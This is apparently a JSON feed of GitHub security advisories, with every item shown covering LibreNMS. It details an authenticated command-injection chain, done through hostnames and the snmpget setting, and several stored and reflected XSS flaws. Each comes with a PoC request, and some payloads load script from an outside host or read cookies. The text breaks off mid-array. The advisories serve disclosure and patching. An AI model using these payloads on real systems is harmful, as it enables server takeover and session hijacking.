{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for PHP packages hosted at packagist.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/composer.json",
    "description": "Security Advisory for PHP packages hosted at packagist.org on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>An authenticated attacker can create dangerous directory names on the system and alter sensitive configuration parameters through the web portal. Those two defects combined then allows to inject arbitrary OS commands inside <code>shell_exec()</code> calls, thus achieving arbitrary code execution.</p>\n<h3 id=\"details\">Details</h3>\n<h4 id=\"os-command-injection\">OS Command Injection</h4>\n<p>We start by inspecting the file <code>app/Http/Controllers/AboutController.php</code>, more particularly the index() method which is executed upon simply visiting the /about page:</p>\n<pre><code class=\"language-php\">public function index(Request $request)\n    {\n        $version = Version::get();\n\n        return view('about.index', [\n            &lt;TRUNCATED&gt;\n\n            'version_webserver' =&gt; $request-&gt;server('SERVER_SOFTWARE'),\n            'version_rrdtool' =&gt; Rrd::version(),\n            'version_netsnmp' =&gt; str_replace('version: ', '', rtrim(shell_exec(Config::get('snmpget', 'snmpget') . ' -V 2&gt;&amp;1'))),\n\n           &lt;TRUNCATED&gt;\n        ]);\n    }\n</code></pre>\n<p>We can see that the <code>version_netsnmp</code> key receives a value direclty dependent of a <code>shell_exec()</code> call. The argument to this call reflects a configuration parameter with no sanitization. Should an attacker identify a way to alter this parameter, the server is at risk of being compromised.</p>\n<h4 id=\"configuration-parameters-poisoning\">Configuration parameters poisoning</h4>\n<p>We now focus on the <code>update()</code> method of the <code>SettingsController.php</code> script. This method is called when the user visits the route <code>/settings/{key}</code> via HTTP PUT. The key parameter here is simply the name of the configuration key the user wishes to modify.</p>\n<pre><code class=\"language-php\">public function update(DynamicConfig $config, Request $request, $id)\n{\n    $value = $request-&gt;get('value');\n\n    if (! $config-&gt;isValidSetting($id)) {\n        return $this-&gt;jsonResponse($id, ':id is not a valid setting', null, 400);\n    }\n\n    $current = \\LibreNMS\\Config::get($id);\n    $config_item = $config-&gt;get($id);\n\n    if (! $config_item-&gt;checkValue($value)) {\n        return $this-&gt;jsonResponse($id, $config_item-&gt;getValidationMessage($value), $current, 400);\n    }\n\n    if (\\LibreNMS\\Config::persist($id, $value)) {\n        return $this-&gt;jsonResponse($id, \"Successfully set $id\", $value);\n    }\n\n    return $this-&gt;jsonResponse($id, 'Failed to update :id', $current, 400);\n}\n</code></pre>\n<p>We can see that some protections are implemented around the configuration parameters by <code>$config_item-&gt;checkValue($value)</code>, with a format of data being expected depending on the data type of the variable the user wants to modify.\nSpecifically, the <code>snmpget</code> configuration variable expects a valid path to an existing binary on the system.\nTo summarize : if an attacker finds a valid full-path to a system binary, while that full-path also holds shell metacharacters, then those characters would be interpreted by the <code>shell_exec()</code> call defined above and allow for arbitrary command execution.</p>\n<h4 id=\"arbitrary-directory-creation\">Arbitrary directory creation</h4>\n<p>When creating a new Device through the \"Add Device\" page, the server allows the user to send malformed or impossible hostnames and force the data to be stored, with no sanitization being performed on this field.</p>\n<p>In the file <code>app/Jobs/PollDevice.php</code>, the <code>initRrdDirectory()</code> method is responsible for creating a directory named after the Device's hostname. We can see the <code>mkdir()</code> call inside the try block:</p>\n<pre><code class=\"language-php\">private function initRrdDirectory(): void\n{\n    $host_rrd = \\Rrd::name($this-&gt;device-&gt;hostname, '', '');\n    if (Config::get('rrd.enable', true) &amp;&amp; ! is_dir($host_rrd)) {\n        try {\n            mkdir($host_rrd);\n            Log::info(\"Created directory : $host_rrd\");\n        } catch (\\ErrorException $e) {\n            Eventlog::log(\"Failed to create rrd directory: $host_rrd\", $this-&gt;device);\n            Log::info($e);\n        }\n    }\n}\n</code></pre>\n<p>This method is called by <code>initDevice()</code>, which is itself called by the <code>handle()</code> method (executed when the job starts).\n<code>\\Rrd::name()</code> simply concatenates a string following the format <code>&lt;LIBRENMS_INSTALL_DIR&gt;/rrd/&lt;DEVICE_HOSTNAME&gt;</code>.</p>\n<h4 id=\"summary-1\">Summary</h4>\n<p>With all this, an authenticated attacker can:</p>\n<ul>\n<li>Create a malicious Device with shell metacharacters inside its hostname</li>\n<li>Force the creation of directory containing shell metacharacters through the PollDevice job</li>\n<li>Modify the <code>snmpget</code> configuration variable to point to a valid system binary, while also using the directory created in the previous step via a path traversal (i.e: <code>/path/to/install/dir/rrd/&lt;DEVICE_HOSTNAME&gt;/../../../../../../../bin/ls</code>)</li>\n<li>Trigger a code execution via the <code>shell_exec()</code> call contained in the <code>AboutController.php</code> script</li>\n</ul>\n<h4 id=\"\"></h4>\n<h3 id=\"poc\">PoC</h3>\n<p>For proof of concept, we will create a file located at <code>/tmp/rce-proof</code> on the server's filesystem.</p>\n<p>Consider the following command : <code>/usr/bin/touch /tmp/rce-proof</code>, encoded in base64 (<code>L3Vzci9iaW4vdG91Y2ggL3RtcC9yY2UtcHJvb2Y=</code>). This encoding is necesary whenever the command contains '/' characters, as this would otherwise generate invalid directory paths.\nCreate a new Device with a name that contains the command you wish to execute enclosed in semi-colons, ending with a '3' character:\n<img alt=\"librenms-1\" src=\"https://github.com/user-attachments/assets/a242fc1a-f04a-4df9-901e-abcc5f14af14\"></p>\n<p>Be careful to tick the \"Force Add\" option, otherwise the request will be rejected. Click add:\n<img alt=\"librenms-2\" src=\"https://github.com/user-attachments/assets/84e0d853-1418-44aa-870b-4259adba27f8\"></p>\n<p>A directory matching the hostname of the Device will be created whenever a PollDevice job is launched. For the purpose of the demonstration, we will be triggering this manually with artisan:\n<img alt=\"librenms-4\" src=\"https://github.com/user-attachments/assets/ce4061ef-6cb6-4847-a229-1417091048f5\"></p>\n<p>We can confirm that this directory indeed exists on the system:\n<img alt=\"librenms-5\" src=\"https://github.com/user-attachments/assets/79f912c6-f200-47d2-b950-d46636dc30ef\"></p>\n<p>We can now update the <code>snmpget</code> parameter value to point to any binary on the system, making sure that the specified path includes the directory that was just created:\n<img alt=\"librenms-13\" src=\"https://github.com/user-attachments/assets/4b49c2db-c716-41ae-b668-ff6bf3d5d8de\"></p>\n<p>Visiting the <code>/about</code> page will trigger the payload, then we can check that our code was indeed executed:\n<img alt=\"librenms-10\" src=\"https://github.com/user-attachments/assets/8fcf0838-50b5-47e0-85d5-0892d9909c76\"></p>\n<h3 id=\"impact\">Impact</h3>\n<p>Server takeover</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/librenms/librenms/security/advisories/GHSA-x645-6pf9-xwxw\">https://github.com/librenms/librenms/security/advisories/GHSA-x645-6pf9-xwxw</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x645-6pf9-xwxw\">https://github.com/advisories/GHSA-x645-6pf9-xwxw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x645-6pf9-xwxw",
            "title": "[librenms/librenms] LibreNMS has an Authenticated OS Command Injection",
            "date_modified": "2024-11-15T15:54:19.000Z",
            "date_published": "2024-11-15T15:54:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x645-6pf9-xwxw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A Stored Cross-Site Scripting (XSS) vulnerability in the \"Custom OID\" tab of a device allows authenticated users to inject arbitrary JavaScript through the \"unit\" parameter when creating a new OID. This vulnerability can lead to the execution of malicious code in the context of other users' sessions, compromising their accounts and enabling unauthorized actions.</p>\n<h3 id=\"details\">Details</h3>\n<p>When creating a new OID for a device, an attacker can inject an XSS payload into the \"unit\" parameter. This payload is reflected in the \"Unit\" column of the table displayed in the \"Custom OID\" tab of the device.</p>\n<p>The payload used to exploit this vulnerability is:\n<code>&lt;script/src=//15.rs&gt;</code></p>\n<p>Note: The payload uses the \"15.rs\" domain to bypass some of the length restrictions found during research by pointing to a malicious remote file. The file contains a POC XSS payload, and can contain any arbitrary JS code.</p>\n<p>The vulnerability is due to improper sanitization of the \"unit\" parameter before rendering it in the HTML output. The sink is as follows:\n<a href=\"https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/print-customoid.php#L90\">https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/print-customoid.php#L90</a></p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Create a new OID for a device using the following payload in the \"unit\" parameter:</li>\n</ol>\n<p><code>&lt;script/src=//15.rs&gt;</code>\n2. Save the OID.\n3. Navigate to the \"Custom OID\" tab of the device.\n4. Observe that the injected script executes in the \"Unit\" column of the table.</p>\n<p>Example Request:</p>\n<pre><code class=\"language-http\">POST /ajax_form.php HTTP/1.1\nHost: &lt;your_host&gt;\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-CSRF-TOKEN: &lt;your_token&gt;\nX-Requested-With: XMLHttpRequest\nCookie: &lt;your_cookie&gt;\n\ndevice_id=15&amp;device_name=test4'&amp;ccustomoid_id=2&amp;type=customoid&amp;action=save&amp;name=test1&lt;script&gt;{onerror=alert}throw+'OID'&lt;/script&gt;&amp;oid=test2&lt;script&gt;{onerror=alert}throw+'OID'&lt;/script&gt;&amp;unit=&lt;script/src=//15.rs&gt;&amp;divisor=1&amp;multiplier=1&amp;user_func=test4&lt;script&gt;{onerror=alert}throw+'OID'&lt;/script&gt;&amp;limit=0&amp;limit_low=0&amp;limit_warn=0&amp;limit_low_warn=0&amp;passed=on\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability allows authenticated users to inject and execute arbitrary JavaScript in the context of other users' sessions when they visit the \"Custom OID\" tab of the device. This could lead to the compromise of user accounts and unauthorized actions being performed on their behalf.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/librenms/librenms/security/advisories/GHSA-gv4m-f6fx-859x\">https://github.com/librenms/librenms/security/advisories/GHSA-gv4m-f6fx-859x</a></li>\n<li><a href=\"https://github.com/librenms/librenms/commit/42b156e42a3811c23758772ce8c63d4d3eaba59b\">https://github.com/librenms/librenms/commit/42b156e42a3811c23758772ce8c63d4d3eaba59b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gv4m-f6fx-859x\">https://github.com/advisories/GHSA-gv4m-f6fx-859x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gv4m-f6fx-859x",
            "title": "[librenms/librenms] LibreNMS has a Stored XSS ('Cross-site Scripting') in librenms/includes/html/print-customoid.php",
            "date_modified": "2024-11-15T15:46:33.000Z",
            "date_published": "2024-11-15T15:46:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gv4m-f6fx-859x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A Reflected Cross-Site Scripting (XSS) vulnerability in the \"metric\" parameter of the \"/wireless\" and \"/health\" endpoints allows attackers to inject arbitrary JavaScript. This vulnerability results in the execution of malicious code when a user accesses the page with a malicious \"metric\" parameter, potentially compromising their session and allowing unauthorized actions.</p>\n<h3 id=\"details\">Details</h3>\n<p>The \"/wireless\" and \"/health\" endpoints are vulnerable to reflected XSS in the \"metric\" parameter. An attacker can inject the following XSS payload into the \"metric\" parameter:\n<code>&lt;script&gt;constructor['constructor'](atob('Y29uZmlybShkb2N1bWVudC5kb21haW4p'))();&lt;!----&gt;</code></p>\n<p>When the page is loaded with this malicious parameter, the script executes immediately. The vulnerability occurs due to improper sanitization of the \"metric\" parameter in the following sinks:\n<a href=\"https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/wireless.inc.php#L82\">https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/wireless.inc.php#L82</a>\n<a href=\"https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/health.inc.php#L114\">https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/health.inc.php#L114</a></p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Inject the following payload into the \"metric\" parameter of the \"/wireless\" or \"/health\" endpoint:</li>\n</ol>\n<p><code>&lt;script&gt;constructor['constructor'](atob('Y29uZmlybShkb2N1bWVudC5kb21haW4p'))();&lt;!----&gt;</code>\n2. Access the page with the injected payload.\n3. Observe that the injected script executes upon loading the page.</p>\n<p>Example URL: <code>http://&lt;your_url&gt;/wireless/metric=%3Cscript%3Econstructor['constructor'](atob('Y29uZmlybShkb2N1bWVudC5kb21haW4p'))();%3C!----%3E</code></p>\n<p>Example Request:</p>\n<pre><code class=\"language-http\">GET /wireless/metric=%3Cscript%3Econstructor[%27constructor%27](atob(%27Y29uZmlybShkb2N1bWVudC5kb21haW4p%27))();%3C!----%3E HTTP/1.1\nHost: &lt;your_host&gt;\nCookie: &lt;your cookies&gt;\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability allows attackers to execute arbitrary JavaScript in the context of a user’s session by crafting a malicious URL. The attack could lead to session hijacking, unauthorized actions, or further exploitation by injecting malicious scripts.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/librenms/librenms/security/advisories/GHSA-28p7-f6h6-3jh3\">https://github.com/librenms/librenms/security/advisories/GHSA-28p7-f6h6-3jh3</a></li>\n<li><a href=\"https://github.com/librenms/librenms/commit/aef739a438ffb507e927a4ec87b359164a7a053a\">https://github.com/librenms/librenms/commit/aef739a438ffb507e927a4ec87b359164a7a053a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-28p7-f6h6-3jh3\">https://github.com/advisories/GHSA-28p7-f6h6-3jh3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-28p7-f6h6-3jh3",
            "title": "[librenms/librenms] LibreNMS has a Reflected XSS ('Cross-site Scripting') in librenms/includes/html/pages/wireless.inc.php",
            "date_modified": "2024-11-15T15:45:32.000Z",
            "date_published": "2024-11-15T15:45:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-28p7-f6h6-3jh3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A Stored Cross-Site Scripting (XSS) vulnerability in the Device Overview page allows authenticated users to inject arbitrary JavaScript through the \"overwrite_ip\" parameter when editing a device. This vulnerability results in the execution of malicious code when the device overview page is visited, potentially compromising the accounts of other users.</p>\n<h3 id=\"details\">Details</h3>\n<p>The vulnerability occurs when editing a device. An attacker can inject arbitrary JavaScript into the \"overwrite_ip\" parameter. This malicious script is then executed in the \"Assigned IP\" field when the device overview page is loaded.</p>\n<p>The payload used to exploit this vulnerability is: <code>test'\"&gt;&lt;script src=//15.rs&gt;&lt;/script&gt;</code></p>\n<p>Note: The payload uses the \"15.rs\" domain to bypass some of the length restrictions found during research by pointing to a malicious remote file. The file contains a POC XSS payload, and can contain any arbitrary JS code.</p>\n<p>The root cause of this vulnerability is the application's failure to properly sanitize the \"overwrite_ip\" value before including it in the HTML output. This is evident in the following line of code:</p>\n<p><a href=\"https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/dev-overview-data.inc.php#L42\">https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/dev-overview-data.inc.php#L42</a></p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Edit a device and use the following payload in the \"overwrite_ip\" parameter: <code>test'\"&gt;&lt;script src=//15.rs&gt;&lt;/script&gt;</code></li>\n<li>Save the changes.</li>\n<li>Navigate to the device overview page.</li>\n<li>Observe that the injected script executes in the \"Assigned IP\" field.</li>\n</ol>\n<pre><code class=\"language-http\">POST /device/14/edit HTTP/1.1\nHost: &lt;your_host&gt;\nContent-Type: application/x-www-form-urlencoded\nCookie: &lt;your_cookie&gt;\n\n_token=&lt;your_token&gt;&amp;editing=yes&amp;display=&amp;overwrite_ip=test'\"&gt;&lt;script+src=//15.rs&gt;&lt;/script&gt;&amp;descr=&amp;type=&amp;parent_id%5B%5D=15&amp;Submit=\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability allows authenticated users to execute arbitrary JavaScript code in the context of other users' sessions. Compromised accounts could lead to unauthorized actions being taken on behalf of the impacted users.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/librenms/librenms/security/advisories/GHSA-p66q-ppwr-q5j8\">https://github.com/librenms/librenms/security/advisories/GHSA-p66q-ppwr-q5j8</a></li>\n<li><a href=\"https://github.com/librenms/librenms/commit/4568188ce9097a2e3a3b563311077f2bb82455c0\">https://github.com/librenms/librenms/commit/4568188ce9097a2e3a3b563311077f2bb82455c0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p66q-ppwr-q5j8\">https://github.com/advisories/GHSA-p66q-ppwr-q5j8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p66q-ppwr-q5j8",
            "title": "[librenms/librenms] LibreNMS has a Stored XSS ('Cross-site Scripting') in librenms/includes/html/dev-overview-data.inc.php",
            "date_modified": "2024-11-15T15:44:28.000Z",
            "date_published": "2024-11-15T15:44:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p66q-ppwr-q5j8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A Stored Cross-Site Scripting (XSS) vulnerability in the \"Port Settings\" page allows authenticated users to inject arbitrary JavaScript through the \"descr\" parameter when editing a device's port settings. This vulnerability can lead to the execution of malicious code when the \"Port Settings\" page is visited, potentially compromising the user's session and allowing unauthorized actions.</p>\n<h3 id=\"details\">Details</h3>\n<p>When editing a device's port settings, an attacker can inject the following XSS payload into the \"descr\" parameter:\n<code>lo'\"&gt;&lt;script/src=//15.rs&gt;</code></p>\n<p>Note: The payload uses the \"15.rs\" domain to bypass some of the length restrictions found during research by pointing to a malicious remote file. The file contains a POC XSS payload, and can contain any arbitrary JS code.</p>\n<p>The payload triggers when the \"Port Settings\" page is visited, exploiting the <code>$port-&gt;ifAlias</code> variable in the application. The sink is located here:\n<a href=\"https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/app/Http/Controllers/Table/EditPortsController.php#L82\">https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/app/Http/Controllers/Table/EditPortsController.php#L82</a></p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Edit a device's port settings using the following payload in the \"descr\" parameter:</li>\n</ol>\n<p><code>lo'\"&gt;&lt;script/src=//15.rs&gt;</code>\n2. Save the changes.\n3. Navigate to the \"Port Settings\" page of the device.\n4. Observe that the injected script executes.</p>\n<p>Example Request:</p>\n<pre><code class=\"language-http\">POST /ajax_form.php HTTP/1.1\nHost: &lt;your_host&gt;\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-CSRF-TOKEN: &lt;your_token&gt;\nX-Requested-With: XMLHttpRequest\nCookie: &lt;your_cookie&gt;\n\ntype=update-ifalias&amp;descr=lo'%22%3E%3Cscript%2Fsrc%3D%2F%2F15.rs%3E&amp;ifName=lo&amp;port_id=1&amp;device_id=1\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability allows authenticated users to execute arbitrary JavaScript in the context of other users' sessions when they visit the \"Port Settings\" page of the device. This could lead to the compromise of user accounts and unauthorized actions performed on their behalf.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/librenms/librenms/security/advisories/GHSA-7663-37rg-c377\">https://github.com/librenms/librenms/security/advisories/GHSA-7663-37rg-c377</a></li>\n<li><a href=\"https://github.com/librenms/librenms/commit/82a744bfe29017b8b58b5752ab9e1b335bedf0a0\">https://github.com/librenms/librenms/commit/82a744bfe29017b8b58b5752ab9e1b335bedf0a0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7663-37rg-c377\">https://github.com/advisories/GHSA-7663-37rg-c377</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7663-37rg-c377",
            "title": "[librenms/librenms] LibreNMS has a Stored XSS ('Cross-site Scripting') in librenms/app/Http/Controllers/Table/EditPortsController.php",
            "date_modified": "2024-11-15T15:43:21.000Z",
            "date_published": "2024-11-15T15:43:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7663-37rg-c377"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The application fail to sanitising inputs properly and rendering the code from user input to browser which allow an attacker to execute malicious javascript code.</p>\n<h3 id=\"details\">Details</h3>\n<p>User with Admin role can edit the Display Name of a device, the application did not properly sanitize the user input in the device Display Name, if java script code is inside the name of the device Display Name, its can be trigger from different sources.</p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Use an Admin role user to change the Display Name of a device into the payload <code>&lt;img src=\"x\" onerror=\"alert(document.cookie)\"&gt;</code></li>\n</ol>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/a0cce15d-fa25-46cf-a16d-648b501724a4\"></p>\n<p>2.1. Go to manage user and choose Manage Access</p>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/079bd7a7-c153-4630-a59e-416bbbaf267b\"></p>\n<p>2.2. A pop-up will show</p>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/2fe15976-c25d-4ba5-a9c1-08cfaa5c1c5b\"></p>\n<p>3.1. Create a new Alert Rule where it will check if the device is up or down by using ICMP and then add the rule to the device.</p>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/135093ba-d28c-4fe4-871d-950a2d521b01\"></p>\n<p>3.2. Once the device is down, there will be an alert in the Alerts Notifications</p>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/f32461be-aee2-43e7-ba50-977ed27754b4\"></p>\n<p>3.3. Hover over the Hostname will see a pop-up.</p>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/314eed99-1372-40e8-818f-4494679e476e\"></p>\n<p>4.1. The same can be trigger in the Alert History once hover over the Device field.</p>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/33dd2045-2c21-4305-a7a6-8c09101baf81\"></p>\n<p>5.1. The same can be trigger once hover over the Hostname field from the Event Log of the device.</p>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/a8a80dc7-4678-4334-a03a-e38d61e55e1c\"></p>\n<p>6.1. The same can be trigger in the Outages function in the Logs of the device.</p>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/b25d1c20-de6d-4c8d-bfab-59691b3faf1e\"></p>\n<p>7.1. In the Active Alerts of the device.</p>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/73571f83-56e2-4e6f-9af4-621df2a0ccdd\"></p>\n<p>8.2. In the Alert History of the device.</p>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/1fa4a86b-4469-4e09-a4d8-174529138199\"></p>\n<p>9.1. They can also be trigger in the dashboard.</p>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/0d3f3926-b41d-48d2-9212-cbd5692f6a9e\"></p>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/6f36fc02-eae5-4a46-b6ba-f99a8d1db8a8\"></p>\n<p>10.1. Also if change the payload into <code>&lt;img src=\"x\" onerror=\"alert(document['cookie'])\"&gt;</code>, it can also be trigger in the Availability Map.</p>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/9ed7ebb1-4906-43f0-aa96-313fe722a533\"></p>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/d7c57840-4431-4ccb-b688-e813c83ac20c\"></p>\n<h3 id=\"impact\">Impact</h3>\n<p>It could allow authenticated users to execute arbitrary JavaScript code in the context of other users' sessions.\nImpacted users could have their accounts compromised, enabling the attacker to perform unauthorized actions on their behalf.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/librenms/librenms/security/advisories/GHSA-4m5r-w2rq-q54q\">https://github.com/librenms/librenms/security/advisories/GHSA-4m5r-w2rq-q54q</a></li>\n<li><a href=\"https://github.com/librenms/librenms/commit/bb4731419b592867bf974dde525e536606a52976\">https://github.com/librenms/librenms/commit/bb4731419b592867bf974dde525e536606a52976</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4m5r-w2rq-q54q\">https://github.com/advisories/GHSA-4m5r-w2rq-q54q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4m5r-w2rq-q54q",
            "title": "[librenms/librenms] LibreNMS has a Persistent XSS from Insecure Input Sanitization Affects Multiple Endpoints",
            "date_modified": "2024-11-15T15:41:39.000Z",
            "date_published": "2024-11-15T15:41:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4m5r-w2rq-q54q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A Stored Cross-Site Scripting (XSS) vulnerability in the \"Services\" section of the Device Overview page allows authenticated users to inject arbitrary JavaScript through the \"name\" parameter when adding a service to a device. This vulnerability could result in the execution of malicious code in the context of other users' sessions, potentially compromising their accounts and enabling unauthorized actions.</p>\n<h3 id=\"details\">Details</h3>\n<p>When creating a device through the \"edit device -&gt; services\" workflow (example path: \"/device/15/edit/section=services\"), the attacker can inject an XSS payload in the \"name\" parameter. This payload is then reflected in the \"Services\" section of the \"Overview\" page of the device. It is important to note that the vulnerability does not exist when creating devices through the normal \"Add Service\" interface (created through the ajax_form.php request with the \"type=create-service\").</p>\n<p>The payload used to exploit this vulnerability is:\n<code>Name'\"&gt;&lt;script/src=//15.rs&gt;&lt;/script&gt;</code></p>\n<p>Note: The payload uses the \"15.rs\" domain to bypass some of the length restrictions found during research by pointing to a malicious remote file. The file contains a POC XSS payload, and can contain any arbitrary JS code.</p>\n<p>The root cause is the application's failure to sanitize the \"name\" parameter before outputting it in the HTML. The sinks are as follows:\n<a href=\"https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/device/overview/services.inc.php#L36\">https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/device/overview/services.inc.php#L36</a>\n<a href=\"https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/device/overview.inc.php#L74\">https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/device/overview.inc.php#L74</a></p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Create a service for a device using the following payload in the \"name\" parameter:</li>\n</ol>\n<p><code>Name'\"&gt;&lt;script/src=//15.rs&gt;&lt;/script&gt;</code>\n2. Save the service.\n3. Navigate to the \"Overview\" page of the device.\n4. Observe that the injected script executes in the \"Services\" section of the page.</p>\n<p>Example Request:</p>\n<pre><code class=\"language-http\">POST /device/15/edit/section=services HTTP/1.1\nHost: &lt;your_host&gt;\nContent-Type: application/x-www-form-urlencoded\nCookie: &lt;your_cookie&gt;\n\n_token=&lt;your_token&gt;&amp;name=Name'\"&gt;&lt;script/src=//15.rs&gt;&lt;/script&gt;&amp;addsrv=yes&amp;device=15&amp;type=pollen&amp;descr=Descr'\"&gt;&lt;script/src=//15.rs&gt;&lt;/script&gt;&amp;ip=IP'\"&gt;&lt;script/src=//15.rs&gt;&lt;/script&gt;&amp;params=Params'\"&gt;&lt;script/src=//15.rs&gt;&lt;/script&gt;&amp;Submit=\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability allows authenticated users to inject and execute arbitrary JavaScript in the context of other users' sessions when they visit the \"Services\" section of the device's overview page. This could result in the compromise of user accounts and unauthorized actions performed on their behalf.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/librenms/librenms/security/advisories/GHSA-qr8f-5qqg-j3wg\">https://github.com/librenms/librenms/security/advisories/GHSA-qr8f-5qqg-j3wg</a></li>\n<li><a href=\"https://github.com/librenms/librenms/commit/b4af778ca42c5839801f16ece53505bb7fa1e7bc\">https://github.com/librenms/librenms/commit/b4af778ca42c5839801f16ece53505bb7fa1e7bc</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qr8f-5qqg-j3wg\">https://github.com/advisories/GHSA-qr8f-5qqg-j3wg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qr8f-5qqg-j3wg",
            "title": "[librenms/librenms] LibreNMS has a Stored XSS ('Cross-site Scripting') in librenms/includes/html/pages/device/overview/services.inc.php",
            "date_modified": "2024-11-15T15:39:53.000Z",
            "date_published": "2024-11-15T15:39:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qr8f-5qqg-j3wg"
            },
            "tags": [
                "severity"
            ]
        },
        {
